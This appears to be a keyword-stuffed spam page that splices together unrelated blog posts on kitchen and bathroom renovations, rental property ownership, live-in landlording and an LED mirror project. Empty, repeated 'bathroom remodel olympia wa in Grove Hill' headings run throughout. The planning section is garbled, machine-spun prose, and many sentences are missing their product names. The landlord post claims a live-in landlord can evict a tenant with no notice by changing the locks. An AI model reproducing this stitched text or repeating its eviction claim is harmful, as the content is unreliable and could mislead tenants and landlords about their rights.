   <div>   <span> &#xbb; , , </span>   <h1>My Cheap DIY Kitchen Renovation: $3,329</h1>   <div>    <span>Last updated by <span><span>G.E. Miller</span></span> on <span>February 7, 2016</span></span>   </div>   <div>    <p>Kitchen renovations are expensive (the is $54K!). However, they don&#x2019;t have to be, with a little DIY effort, planning, and thinking outside of the box. The following story shares how I was able to complete a major kitchen renovation (with high quality materials) for just over $3K!</p>   <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>    <p>It all started with a little drip.</p>   <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>    <p>My kitchen faucet had started rusting through on a key welding point. The result was a tiny slow leak that would occasionally get big enough to start puddling on to my cheap (and inherited) laminate countertop and seep in at a key seam point. From there, the water was weakening the glue bond and causing the laminate to bubble up in spots. I was done with it.</p>   <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>    <p>At this point, I knew that the faucet and countertop needed some changing up. However, when you change a countertop, you also need to change the backsplash (due to the height of the new counter being different. Mine was very outdated and ugly, so this fact did not sadden me.</p>    <p>Meanwhile, a few of my appliances were on their last breath, as they were all nearing the 20-year mark. They were inefficient in their use of energy and had definitely seen much better days. And the mix of black, white, and wear did not match anything else in the kitchen. Normally, I&#x2019;d be willing to overlook this, but in light of the other deficiencies, it was time for some updating.</p>    <p>To top it all off, my stainless sink was a small, loud, cheap, and scratched-up contractor grade sink, with very little depth for holding and washing dirty kitchenware.</p>    <p>I wish I would have taken a more expansive photo, but here&#x2019;s a &#x201c;before&#x201d; photograph (post backsplash tear-down):</p>    <p>Luckily, my cabinets had always been the bright spot of the kitchen, as you can probably see from the photo. They were custom built, from scratch, by the previous homeowner and have a rustic, natural look, which we like. They could use a bit of resurfacing in areas, but they weren&#x2019;t going anywhere. After hearing how new cabinets can cost in the upwards of TENS OF THOUSANDS, we were feeling very lucky.</p>    <p>All things considered, it was time for a kitchen renovation!</p>    <p>We set out with the following five goals in mind:</p>    <ol>     <li>Minimal cost, without sacrificing quality.</li>     <li>As much DIY as possible to save money and learn.</li>     <li>No waste. We didn&#x2019;t want anything to end up in the landfill.</li>     <li>A look and functional utility that we&#x2019;d be happy with for many years to come (and would be looked at as an asset by any potential homebuyer, should we move at some point).</li>     <li>Efficiency.</li>    </ol>    <p>How did do? Here&#x2019;s a deeper look at each purchase.</p>    <h3>Countertop:</h3>    <p>We knew this would be our biggest expense and have the highest impact. Given the rustic pine look, we couldn&#x2019;t go with a wood countertop. Both wood and tile are high maintenance as well. That left us with stone, which is low maintenance, looks great, and is the desirable standard for homebuyers.</p>    <p>Unfortunately, stone is not cheap. After a lot of research, we decided to go with a crushed quartz countertop over granite due to its durability and finish. After looking around, we noticed that one particular style ( Kilauea) at Home Depot that we liked would often go on sale (10% off). On top of that, we also noticed that Home Depot runs &#x201c;10% off installations&#x201d; once every 6 weeks or so and it could be stacked on top of any individual style discounts. So we waited&#x2026; and ended up saving 20% off of full price.</p>    <p>Additionally, we declined removal of the old countertop (we tore it off ourselves) and an undermount sink installation (opting for an over-mount), saving us $500. We put the old counter on Craigslist, listed for free, and within a few days it was picked up. Landfill avoided.</p>    <p>An interesting note to anyone thinking of granite &#x2013; the installers said they would personally go with quartz over granite any day of the week, because of its added durability &#x2013; they had seen way to many granite counters break.</p>    <p>Total cost for 36 square feet installed (20% off, plus sales tax) = $1,978.</p>    <h3>Sink:</h3>    <p>We decided to go with a crushed composite granite sink, because they don&#x2019;t scratch and aren&#x2019;t loud &#x2013; and we love it. We elected to do an over-mount, which saved us $260 on installation from Home Depot. We went with a on Amazon because it had a perfect 5-star rating (with 127 reviews!) and it was 10 inches deep on the large side (for large pots/pans), with a functional lowered partition.</p>    <p>I was able to sell the old sink on Craigslist for $25.</p>    <p>We also re-plumbed the sink and saved about $150 on installation.</p>    <p>Total cost (49% off msrp) = $256</p>    <h3>Faucet:</h3>    <p>We wanted a stainless steel faucet for their reliability and to have a nice contrast with the black granite sink. We liked the price, functionality, and lifetime warranty (after the failure of our previous faucet) on the .</p>    <p>We recycled the old faucet.</p>    <p>Total cost (42% off msrp): $94 (free with gift cards)</p>    <h3>Appliances:</h3>    <p>Long story short (I previously highlighted and and get at least 25% off EVERY TIME) &#x2013; we ended up going with highly rated, yet low cost Whirlpool appliances, all from Sears. This was after much shopping around and Craigslist scouring.</p>    <p>All appliances were stainless steel (the fridge was faux stainless) and the dishwasher and fridge were extremely high efficiency and Energy Star (microwaves and ovens are not rated by Energy Star).</p>    <p>Additionally, I was able to sell each of my old appliances on Craigslist for the following:</p>    <ul>     <li>dishwasher: $35</li>     <li>microwave: $35</li>     <li>refrigerator: $150</li>     <li>stove: $160</li>     <li><strong>total: $380</strong></li>    </ul>    <p>This was very satisfying.</p>    <p>Here is what we ended up paying for each (including tax and free delivery) of the new appliances:</p>    <ul>     <li>dishwasher: $290 (regularly $480)</li>     <li>microwave: $208 (regularly $259)</li>     <li>refrigerator: $665 (regularly $900)</li>     <li>stove: $375 (regularly $729)</li>     <li><strong>total: $1,538 (regularly $2,368) &#x2013; 35% off! </strong></li>    </ul>    <p>Considering many newer stainless refrigerators cost $1,500 on their own, I was extremely pleased with the total cost and quality. And when you factor in the $380 I got for my old appliances, my total net cost for 4 new, efficient, stainless appliances was just $1,158!</p>    <p>We self-installed each appliance, which was a learning experience and saved us a few hundred dollars.</p>    <h3>Backsplash:</h3>    <p>The final and most component of the renovation was the backsplash. Many installers charge upwards of $40/sq. foot (!) for backsplash tiling which means you better damn well learn to tile for yourself! We had never done any prior tile work, so this was a great learning experience.</p>    <p>We wanted a 3&#x2033; x 6&#x2033; subway-style tile. Unfortunately, outside of pricey $10/sq. foot stone tile, nobody makes anything but solid white and black subway tiles. So&#x2026; we decided to buy 12&#x2033; x 12&#x2033; ceramic tile and make cuts, with each producing 8 tiles. This had the dual benefit of not only giving us much more variety in choice of tile, but also massive cost savings &#x2013; at just $0.79/sq. foot! And as you can see, via the photo to the right, we got a stone look with a printed ceramic for about 1/15th the price of stone tile.</p>    <p>We first rented a wet saw from Home Depot to do all of the cutting. Big mistake. Ours was not making straight cuts and it was nearly impossible to guarantee each cut piece was close to identical in size, so we returned it and got a refund. Then, I ended up purchasing a from Lowe&#x2019;s and the cuts were near perfect every time. And now I can use the cutter for all future jobs.</p>    <p>Total cost for the cutter  3 boxes of tile  grout  tools = $140</p>    <h3>The End Result:</h3>    <p>How did we do against all of our goals?</p>    <ol>     <li><strong>Minimal cost, without sacrificing quality.</strong> Massive success. We love the quality and not many kitchen renovations can be done with all new materials for a net of $3,329, subtracting what we were able to sell. The total cost on product at full price was $5,806. Additionally, we saved about $2,000 by opting for DIY versus having all the work outsourced.</li>     <li><strong>As much DIY as possible to save money and learn.</strong> Achieved. We were DIY on everything we could have been: tear-down, sink, faucet, plumbing, appliance hookup, and backsplash.</li>     <li><strong>No waste. We didn&#x2019;t want anything to end up in the landfill.</strong> Huge success! Outside of a few broken tiles, literally nothing ended up in a landfill. Everything was donated, sold, or recycled.</li>     <li><strong>A look and functional utility that we&#x2019;d be happy with for many years to come (and would be looked at as an asset by any potential homebuyer, should we move at some point).</strong> Mostly successful. We don&#x2019;t have the most modernized, high-end kitchen, but I don&#x2019;t think many buyers at our home price point are going to find a much nicer kitchen. Granted, the cabinetry gives it a very rustic look, which is not everyone&#x2019;s cup of tea.</li>     <li><strong>Efficiency.</strong> We were efficient where we could be: dishwasher, refrigerator, and low-flow faucet.</li>    </ol>    <p>And here&#x2019;s the end result:</p>    <p>Not bad at all!</p>    <p>Have you renovated your kitchen?

   <div>   <p>Yesterday, I received an email from my , asking if she could buy a new vacuum cleaner. This is the third one that would be bought for that property, in four years. I don&#x2019;t know how long your vacuums last at home, but I think my mum has had the same one for over 10 years. Sure, there are four people living in the property and any item will get heavier wear and tear than if I just rented to a single person, but replacing something when you don&#x2019;t even live on the same continent is a bit of a pain. And I was informed that the bath tub had some mold, a window didn&#x2019;t close properly, and a few other news a landlord always dreads to listen. So to put things into perspective, here is a list of good and not so good things about rental properties.</p>  <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>&#xa0;</p>  <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <h2>The good</h2>   <p>&#xa0;</p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p><strong>Money!!</strong> That is why you are in in the first place, so yes, it is really nice to see the money come into your account every month. Especially if you managed to get a good rental yield, and if your tenants, like mine, pay by wire transfer, you know the money will come, and it will cover the bills and then some.</p>   <p>&#xa0;</p>   <p><strong>Almost passive investment. </strong>is almost a passive investment. You can make it fully passive by hiring a property manager for a small fee. Except in my town that fee was above 20%, and when you take off the taxes on top, well, that&#x2019;s a lot. So far I have managed to oversee everything from abroad, mainly thanks to perfect tenants.</p>   <p>&#xa0;</p>   <p><strong>Building equity. </strong>Not only are you receiving a little bit of money every month, you are also paying off a mortgage, or more exactly, your tenants are paying for it. In 20 years, you will be the owner of a property someone else paid for. I guess even your parents didn&#x2019;t give you such a nice gift.</p>   <p>&#xa0;</p>   <p>&#xa0;</p>   <h2>The bad</h2>   <p>&#xa0;</p>   <p><strong>Wear and tear. </strong>So far this year we have had a broken heater, a broken washing machine that was first fixed then replaced, a broken vacuum and a few minor items. Total was over $1,000, which is a good chunk of profit, although it is tax deductible. You should account for wear and tear when you crunch your numbers before buying a rental.</p>   <p>&#xa0;</p>   <p><strong>Not so passive investment. </strong>Being a is <em>mostly </em>passive, until it is not. What I dread most are vacancies. I need to put ads online, pre-screen potential tenants, then ask the current ones to meet with them for interviews and let me know the one they liked best, as they will be roommates, I have learned from being one myself at some point that it is better to put in someone the others will get along with or you are bound for disasters. When something breaks, you have to go on site, or pay an arm and a leg for someone to do it for you (my solutions, when tenants can&#x2019;t DIY), eating up your rental profits.</p>   <p>&#xa0;</p>   <p><strong>Taxes. </strong>Although you can offset part of the wear and tear, and depending on where you live, the interests of your loan from the mortgage, rental income is usually taxed pretty high. Get together with an advisor to see if it is more profitable to operate your rentals under a limited company or any other setup that will help you lower your tax burden.</p>   <p>&#xa0;</p>   <p>&#xa0;</p>   <h2>The ugly</h2>   <p>&#xa0;</p>   <p><strong>Catastrophes</strong>. It happened to me as a tenant, my place got flooded, the roof started leaking all over my stuff and there was so much water the neighbor below also got flooded. It was a national disaster and insurance companies were overwhelmed, so my landlord didn&#x2019;t get back much, just enough to fix the roof, but was still out of pocket to replace the carpet and paint the walls. Double, triple check how well insured you are, because when something happens, it can cost you thousands.</p>   <p>&#xa0;</p>   <p><strong>Bad tenants. </strong>They are the worst part of it all. When my tenant died in Paris, he had been paying his rent on and off for 9 years, but I always had landlord insurance like CIA insurance, and they paid in his place then dealt with him to get the money. When his widow stopped paying for 18 months and her eviction took that long, they paid too. They covered a cleaning of the place and took out all the trash they had hoarded for 10+ years. But the place was still a mess, in dire need of repairs after 10 years of bad treatments. I may moan about my UK tenants being needy but at least they help me keep the place in good shape, whereas the other ones didn&#x2019;t let me in or make contact for years. Bad tenants are more than people who do not pay. Imagine they set your property on fire, or break all windows just because they fancy! It will take more than their deposit to cover your losses.</p>   <p>&#xa0;</p>   <p>&#xa0;</p>   <h3><strong>Want to share a tenant horror story?</strong></h3>    </div>

   <div>   If your home is old enough for a bathroom renovation, you may want to go ahead and completely gut it. I started my bathroom remodel last month with a complete demolition. If I hadn't, a number of problems would have been unavailable for repair...or even undiscovered. Here's what I found when I opened up the walls and ceiling of my 1970 condo in the Atlanta, Georgia area.  </div>  
   <div>   <div>     <p>Drawing a scale diagram of the bathroom remodel is not way too hard remember doing such like in school? Make existence simpler on your own by drawing your intend on graph paper or squared paper. Case a piece of paper with vertical and horizontal lines attracted at times but it&#x2019;ll make things a lot simpler for you personally.</p>   <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>    <p>Yes there&#x2019;s software for creating your bathroom remodel</p>   <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>    <p>How come everybody appear to wish software to get it done all on their behalf? People believe that all they have to do is buy a remodeling or design program for his or her computer also it is going to do the entire factor on their behalf. Now this just is not going to take place. There&#x2019;s software available and you will find some excellent programs too. Does it help make your existence simpler whenever you redesign your small bathroom remodel? Most unlikely.</p>   <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>    <p>Now if you&#x2019;re a property developer or perhaps a professional designer of kitchen areas and lavatories then remodeling software is a valuable part of the existence since it allows you to definitely reuse your projects again and again again. However if you&#x2019;re just redecorating your bathroom remodel in your own home i quickly would advise against it.</p>    <p>Scale drawing is not too hard</p>    <p>All you need to do is precisely measure your bathroom remodel and divide all of the dimensions with a appropriate number to ensure that it&#x2019;ll fit onto how big paper you will use. For example for those who have a bathroom that&#x2019;s 8 feet by 10 feet and you need to result in the drawing fit onto a bit of graph paper which has 16 squares by 25 squares a appropriate scale could be 1 feet = 2 squares. After that you can draw the outline of the bathroom as 16 squares by 20 squares.</p>     <p>Eliminate the bathroom remodel fittings and place them around the graph paper</p>    <p>This is actually the fun area of the job. It&#x2019;s like fitting together a jigsaw puzzle but there can be many different ways for that pieces to visit. You may need a couple of sheets of graph paper with this. Draw the outline of the bathroom remodel on a single sheet of graph paper and also the outlines from the toilet, bath tub, shower, washbasin along with other stuff on another sheet. You might need a couple of pieces of paper to attract fittings of varying shapes and dimensions to test within the plan. Eliminate the paper fittings and spend some time organizing these to fit over your outline bathroom drawing.</p>    <p>Having your bathroom remodel design right very first time</p>    <p>You will likely need to accept your brand-new bathroom remodel for any very long time following the transformation therefore it is effective spend the required time onto it in the design stage before you begin the job. Trust me it is a lot simpler to maneuver a couple of cutouts around on a bit of graph paper than to maneuver a rest room once it&#x2019;s installed.</p>    <p>You&#x2019;ll need plans from the space on the floor searching lower. Additionally, you will need plans from the walls, especially if you&#x2019;re planning bathroom remodel, mirrors or cabinets.</p>    <p>Talk to your bathroom remodel companies before you decide to finalise your plans</p>    <p>Your companies will have the ability to explain any problems you may have together with your plan and suggest ways that you could adjust items to solve the issues. This can be a essential area of the project and could be the main difference from a smooth bathroom remodel job along with a nightmare when mistakes have to be remedied later.</p>   </div>  </div>

   <div>   <p>&#xa0;</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>Every other Monday, we look at real estate as a way to make money. I have explained , and gone over a . Today, we look at doing with what you already have, that is renting part of your house or your basement to a new tenant.</p>  <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>&#xa0;</p>  <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <h2>Being a live in landlord</h2>   <p>&#xa0;</p>   <p>has a lot of perks. First, you are on the property first hand, so you can see if in spite of you tenant&#x2019;s background check, something is still off. A tenant who is good on paper can be noisy, put a lot of wear and tear on your property by slamming the doors, or try to sneak in a pet in spite of your no pet policy. <strong>By living on the property, you can straighten things up from the start. </strong>Chances are &#x201c;bad&#x201d; tenants will avoid you from the start, and only good tenants will move in.</p>   <p>I have lived with two roommates in a place I owned and it was much better, at least for me, than the previous houseshares I had lived in with no landlord around. The landlord would come once a quarter, take days to fix something, and no one would care about the property. With a live in landlord, people behave better, and the landlord is there to solve any problem. The property should be in better shape, as no landlord likes to live in a dump.</p>   <p>The thing I liked the most as a live in landlady was that you could evict the tenant with no notice. In the the rules are pretty strict about tenant protection if you rent the whole property. But if you live there, you just have to change the locks and put the tenant&#x2019;s stuff outside your property, and you are good. I never did it, but on every interview, I made sure the tenant understood it was a possibility if they were late on rent or started damaging the property. I don&#x2019;t know if the threat deterred the worst tenants but I never had a problem.</p>   <p>&#xa0;</p>   <p>&#xa0;</p>   <h2>Setting the rent of your property</h2>   <p>&#xa0;</p>   <p>If you bought your main residence, you probably have a mortgage, and have had to put a good chunk of money down. You may even have opted for a 15 years mortgage or be making extra payments to pay it off faster. If your normal mortgage was $1,000 a month but you are paying $3,000, it doesn&#x2019;t mean that your tenant has to pay half of that.</p>   <p>You need to align with the market prices for similar properties. On Craigslist and other ad boards, you can find the rates to rent a bedroom in a houseshare, and a basement or attic with independent access. To make a faire comparison with the market you need to compare all the amenities you are offering.</p>   <p>&#xa0;</p>   <p>&#x2013; Will the tenant just have access to a room or also living room and kitchen?</p>   <p>&#x2013; Will the tenant be able to use your washer and dryer?</p>   <p>&#x2013; Are you renting furnished or unfurnished?</p>   <p>&#x2013; Is the entrance separate or through your living room?</p>   <p>&#x2013; Will the tenant have a ?</p>   <p>&#x2013; What bills are you including?</p>   <p>&#x2013; Are taxes and insurance&#xa0;included too?</p>   <p>&#x2013; Are you offering a peer to peer relationship, say you are in your mid 20s taking on other college kids or young professionals, or is it your family house and you take in a boarder who won&#x2019;t be able to choose what movie to watch on TV tonight?</p>   <p>&#xa0;</p>   <p>In my property, I have opted for an <strong>all inclusive rate</strong>. Everyone is happy, the tenants because the do not need to budget for the bills every month, they know exactly what their housing costs will be, and me because I don&#x2019;t have to make complicated calculations to split the bills, send each of them a recap counting pennies, and get bitter if they spend too much time in the shower or do laundry too often. I also make sure my bills stay low by checking once a year on comparison sites that I pay the lowest rate possible for utilities, I have well insulated windows, and installed low-flow toilets like the and shower heads. The tenants barely watched TV so I asked them if they were OK to get rid of the cable in exchange for a better internet plan and they agreed, resulting in added savings.</p>   <p>&#xa0;</p>   <h2>Day to day living with a tenant</h2>   <p>&#xa0;</p>   <p>If the , you want to set clear rules from the start. When is it ok to make noise, can he have company over, can company stay the night, how many nights maximum before it becomes double occupancy and both have to pay rent, etc.</p>   <p>Imagine an abusive little brother crashing at your place for months, what would you like to tell him from day 1? Tell that to your tenant FROM DAY 1. After you become friends or discover you can&#x2019;t stand each other, communication will be harder. How do you tell a friend to do dishes? To clean after himself? Give them a copy of house rules when they move in, and talk as soon as there is a problem.</p>   <p>Set boundaries about rooms the tenant cannot go into, it is better if each person has a key to his or her room to avoid problems, and a shelf in the kitchen, fridge and bathroom. Make space for them so they feel welcome but define your space too.</p>   <p>&#xa0;</p>   <h2>Attic, basement and separate unit</h2>   <p>&#xa0;</p>   <p>This is the best of both worlds. Instead of having to supervise a , you have it right above or under you, yet your tenants do not invade your space. Maybe your driveway and garden, but you will have set rules for that in your contract as well. Renting a separate unit counts as a full tenancy, and the live in landlord eviction rights do not apply. One more reason to be very thorough with your tenant&#x2019;s background check.</p>   <p>Be discreet and leave them space, but also keep an eye for any suspect behavior, extra people staying overnight too often, are they living there, are they keeping the property in good shape, etc.</p>   <p>NEVER, ever even start thinking about grabbing an extra key and checking the inside of their property while they are away. It is illegal in many places and the tenant could sue you. If you have a doubt, ask nicely if they would let you in for an inspection, and if not, what is their reason.</p>   <p>Having them close is also very convenient to chase late payments.</p>   <p>&#xa0;</p>   <p>This post was featured on the , , , , Blog Post Directory, Canadian Budget Binder, , thank you</p>   <p>&#xa0;</p>    </div>

   <div>   <h1>How to Light Up&#xa0;a Mirror</h1>   <p>If you have a mirror at home that you want to jazz up, this could be the perfect DIY for you. Adding LED lights behind your mirror adds some ambiance and a hotel feeling to your bathroom, or any other room in your house for that matter. Just be sure there&#x2019;s an outlet behind the spot&#xa0;you want it!</p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>&#xa0;</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p>This project took Joe only an hour or so. Here he is measuring our mirror.</p>  <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <h2>Steps to Getting Your Mirror Glowing</h2>   <p>Start with a standard mirror. Ours was from Menards, and didn&#x2019;t cost too much, although they can get pretty spendy.</p>   <p>We started with something like and bought some pieces of wood to frame it out. You want to have the mirror sticking out a little bit to create a soft glowing effect behind it. So to create a space behind the mirror, we need to build a platform behind it to sit on.</p>   <p>&#xa0;</p>   <p>Once you have your mirror turned over and measured, cut your wood frame to nest just a little bit inside the borders of your mirror. You can either nail the four pieces of wood together, or use wood glue.</p>   <p>&#xa0; </p>   <p>Next, use some industrial strength glue to mount&#xa0;your frame to the back of the mirror.</p>   <p>Make sure it&#x2019;s even on all sides before glueing. Let it dry for a couple hours.</p>   <p>Next, notch out a hole for your string of lights. This part will be hidden behind your mirror.</p>   <p>&#xa0;</p>   <p>Then you just need to stick the strip of LED lights around the backside of your&#xa0;mirror, close&#xa0;to the edges, to create a glowing effect coming out from the mirror.</p>   <p>One of Joe&#x2019;s can&#x2019;t-live-without supplies is his strings of LED lights. He and uses them virtually everywhere. They&#x2019;re handy because the backs have&#xa0;mounting tape right on them, pull and stick style.</p>   <p>They also come with a remote control to choose whatever color you&#x2019;re in the mood for. They&#x2019;re flexible and waterproof, and super thin so you can hide them under your cabinets and do all kinds of fun things with them.</p>   <p>&#xa0;</p>   <p>That&#x2019;s it! Hang your mirror up and plug the lights in.</p>   <p>&#xa0;</p>   <p>You glow, Joe.</p>   <p>He added a few more fun touches to the bathroom too. Joe&#x2019;s in his happy place.</p>   <p>If you don&#x2019;t mind not having a bathroom medicine cabinet, I think this is a great option for mirrors. We have plenty of storage, so this lightweight mirror was perfect for us. Although, I&#x2019;m sure you could figure out a way to do it with something bigger and heavier too.</p>   <p>&#xa0;</p>   <h4>Still to Come:</h4>   <ul>    <li>Shower Glass</li>    <li>Shelves</li>    <li>Hardware</li>    <li>Trim and Door</li>    <li>Decor/Hardware</li>    <li>Reveal</li>    <li>Surprises</li>   </ul>   <div>    <div>     <h3>Related Posts</h3>    </div>   </div>   <div>    <div>     <h3>Care to Share:</h3>    </div>   </div>   <div>    <h3>Like this:</h3>    <div>     <span><span>Like</span></span>     <span>Loading...</span>    </div>   </div>   <div>    <h3><em>Related</em></h3>   </div>  </div>  
   <div>   <p>If you didn&#x2019;t know the Rineharts moved, we have.&#xa0; We actually haven&#x2019;t officially lived in Sidney house, which we miss so very much, since the beginning of December.&#xa0; Problem is, I still haven&#x2019;t finished all the posts that came along with the bathroom remodel project that we&#x2019;ve, SPOILER ALERT, have already finished.&#xa0; I suppose the fact that it&#x2019;s complete is a good thing for the next owner to not have a bathroom that is 3/4 forth complete!&#xa0; If you haven&#x2019;t seen the learning in process you can check out some of the beginning stages<strong> .</strong></p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>So here is what we are going to do.&#xa0; I&#x2019;m going to try and combine a few different steps of the build together and display in mini-posts.&#xa0; The first stop in our mini-project tour is going to be the painting of the walls.&#xa0; Kelli is the decorator of the Rinehart duo.&#xa0; For the bathroom she wanted an airy fresh color since the bathroom is in a basement.&#xa0; I think the color turned out pretty nice.&#xa0; I&#x2019;m not sure what the name is, I&#x2019;m sure its something slightly ridiculous like Easter bunny teal or possibly spring tulip petal green, but I&#x2019;m sure she can let you know if you ask.</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p>One of the steps I was most proud of was the shower stall.&#xa0; Overall I feel like it&#x2019;s pretty official.&#xa0; The corners were clean and at 90 degree angles, there were no leaks in my plumbing. the platform didn&#x2019;t collapse when I stood on.&#xa0; I mean what else could you ask for?!?!</p>  <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>Such an artist (pronounced like art-eest)&#xa0; I&#x2019;m getting fancy. We got this contraption at IKEA.&#xa0; I would highly recommend this drying rack to anyone without kids as it works very well.&#xa0; For those of you with kids, coming from a kid in an adult body, this looks like a climbing challenge waiting to be conquered.&#xa0; </p>   <p>The toilet is looking good against the New England Boat Moss paint color don&#x2019;t you think?</p>   <p>Again, we used the neutral base paint to seal the door so the moisture from the shower doesn&#x2019;t create mold or any other disgusting substance that bathrooms create.&#xa0; I really love that texture.&#xa0; You will begin to see that theme in a lot of the projects that we do.&#xa0; Plus the wood is free and when you run out you offer to remove your neighbors old fence so they can replace their &#x201c;eyesore&#x201d; of a fence. &#x1f609;&#xde09;</p>   <p>&#xa0;The third step is our unattractive pipe going from the ceiling to the floor.&#xa0; I can&#x2019;t say we were very creative on this one, we only painted it.&#xa0;&#xa0; Surprisingly though, it cleaned it up pretty well.</p>   <p>&#xa0; I don&#x2019;t have a ton of pictures of the base boards.&#xa0; It&#x2019;s these details that helped make the room really look like a finished space. &#xa0; </p>   <p>This is one of the mistakes that I made during the bathroom remodel.&#xa0; I went to put in a recessed light or also referred to as a &#x201c;can light&#x201d; at the bottom of the stairs right outside of the bathroom.&#xa0; I didn&#x2019;t think anything of it when I went to make the cut but I didn&#x2019;t take into consideration the floor joist on the other side of the ceiling.&#xa0; Needless to say I had to do a little drywall repair.</p>   <p>The final stop on the tour is the bead board ceiling.&#xa0; This part was pretty difficult because of the amount of angles and large pieces of bead board that we used.&#xa0; I was able to only use 4 total sheets of 4&#x2032; X 8&#x2032; white bead board.</p>   <p>I did quite a bit of prep work to make sure everything was going to work like I was expecting.&#xa0; I cut small pieces of 2X4s and screwed them into the floor joist.&#xa0; This dropped the ceiling down far enough that I didn&#x2019;t have any issues with the plumbing or electrical work.</p>   <p>For this part, I was lucky enough to have my buddy Andrew there to give me a hand.&#xa0; His job is a high school math teacher, so that extra help with all the angles that I mentioned before was very much appreciated.&#xa0; Andrew and I grew up together since we were wee little tikes in the 6th grade.&#xa0; It seems like just yesterday I was schooling him in some basketball on his old school garage mounted goal.&#xa0; Good times!</p>   <p>And ta-da!&#xa0; I know these are great &#x201c;after&#x201d; pictures, but there will be more to come.&#xa0; What that really means is that I need to learn how to use Photoshop so Kelli doesn&#x2019;t have to edit all of our pictures.&#xa0; Just put it on my tab:)</p>   <p>Hope you have enjoyed.&#xa0; Until next time!</p>   <p>-Eric-</p>   <div>    <p>Related posts:</p>   </div>  </div>

   <div>   <h1>Sammamish master bath remodel</h1>   <div>    <span>Posted on </span>    <span> by </span>    <span> <span>&#x2014;</span> </span>   </div>    <div>    <div>     <p>Master Bathroom Remodel in Sammamish, Washington</p>    <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>    <h2></h2>    <p></p>    </div>    <h4>How and why it started</h4>    <p>This is a recently completed bathroom in Sammamish Washington.&#xa0; The bathroom finishes were outdated and the shower started to have some water damage and leaking issues, but because of having bad contractor experiences in the past, the clients were reluctant to start in on a remodel. Although I came recommended by a friend of theirs whom I had done some work for they were still very diligent in interviewing multiple contractors and asking a lot of questions.</p>   <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>    <p>Even after they decided on a contractor, they did a lot of research and were careful in selecting the components and finishes in their bathroom. Remodeling wasn&#x2019;t something they were excited about doing but if they were going to go through with it they wanted to get it right.</p>   <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>    <div>     <p>The water damage was worse than we had anticipated</p>    </div>    <h4>Worse than we thought</h4>    <p>The old shower tile was installed over green board and once water started to get in through some cracked grout joints the damage was done. The wall board will swell and expand and make things worse. The shower had been repaired and the homeowners kept things in good condition but this had the effect of disguising what was going on behind the scenes.</p>    <p>When the walls were opened up it showed that the damage to the framing and structure was extensive.</p>    <h4>Putting things back together</h4>    <p>The clients chose large format 20&#xd7;20 tiles to be installed throughout the bathroom with a glass/stone mix mosaic as an accent in the shower and the tub back splash. The new shower liner was flood tested for leaks before moving forward with the tile installation. A moisture barrier and cement board were installed on the walls as per code and will be a much sounder longer lasting installation than what they had before.</p>    <div>     <p>Tile floor with tile floor base.</p>    </div>    <div>     <p>finished tile in shower</p>    </div>    <p>In addition to the tile, a new vanity with granite counter, tub and plumbing fixtures, lighting, and paint were added to make it a complete bathroom rennovation.</p>    <h4>Budget</h4>    <p>As with anything, there are always sacrifices to be made, otherwise you will just keep spending money with no limits. Here are two things that were considered, but ultimately decided against:</p>    <p><strong>Heated tile floors:</strong> Everyone loves floor heat but the price tag drives many people away. In addition to the heat wires, labor, and programmable thermostat you have to consider the cost (in many cases) to have an electrician run another circuit from the electrical panel.</p>    <p><strong>A for the shower:</strong>&#xa0; I strongly believe that this method of waterproofing is superior to the more traditional way of constructing a shower. However, a traditional method, done correctly, is not only an approved Tile Council of North America method (TCNA) but is a long lasting tried-and-true way of building showers. Hence Schluter Kerdi was scrapped in favor of the more economical shower pan liner &amp; behind the wall moisture barrier.</p>    <p>Not everything was sacrifices, however. Here are some upgrades they decided to go with:</p>    <div>     <p>Two recessed shampoo niches were installed in the shower</p>    </div>    <p><strong>Two recessed shampoo niches with shelves:</strong> We had a lot of&#xa0; talks about these so that they would serve this customers needs. We made them tall enough to put shelves in and give them two compartments per niche. Also we located them on the end wall which made them as out-of-site as possible. This also made it so that they could not be see in the bathroom mirror when you walk in the room.</p>    <p><strong>Stain-proof grout:&#xa0;</strong> The customer was tired of dealing with all the grout joints so they chose large format tile and went with . Although it&#x2019;s technically not a urethane it competes with other urethane grouts such as Quartlock2, Dimension, and Tru-color. These are the top-of-the-line grouts that are currently available and advertise themselves as being stain-proof. Fusion is not cement based so the color won&#x2019;t fade over time and it doesn&#x2019;t have to be re-sealed every year like cement grouts do.</p>    <p><strong>Ebbe drain:&#xa0;</strong> This isn&#x2019;t a big ticket upgrade but the are well thought out. The covers are easy to remove (no screws), they come with a built in hair trap, and you can get them in a variety of finishes to match your other shower fixtures. These are an easy upgrade over the typical drain you get at the plumbing store.</p>    <p>Ultimately, this bathroom turned out well and serves the customers needs. It was built the way that they wanted and was within their budget. They&#x2019;ve left me positive reviews online and are already planning their next bathroom.</p>    <div>     <p>Stain-proof Fusion grout was 